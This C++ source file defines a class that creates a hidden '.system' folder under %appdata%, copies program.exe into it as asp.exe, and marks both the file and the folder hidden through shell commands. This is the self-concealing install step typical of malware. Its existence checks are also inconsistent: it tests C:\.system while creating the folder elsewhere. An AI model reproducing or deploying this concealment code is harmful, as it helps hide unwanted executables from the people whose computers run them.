#include <iostream>
#include <fstream>
#include <filesystem>
#include <sys/stat.h>
#include <windows.h>
#include <tchar.h>
#include <io.h>
using namespace std;

class CopyFileToDir {
    public:
    void Copy () {
        ifstream floder("C:\\.system");
        ifstream file("asp.exe");
        if(!floder.good()==true) {
            system("md %appdata%\\.system");
            if(!file.good()==true) {
                system("COPY /y program.exe %appdata%\\.system\\asp.exe");
                system("ATTRIB +h \"%appdata%\\.system\\asp.exe\"");
                system("ATTRIB +h \"%appdata%\\.system\"");
            } else {
                system("exit");
            }
        } else {
            system("exit");
        }
    }
};
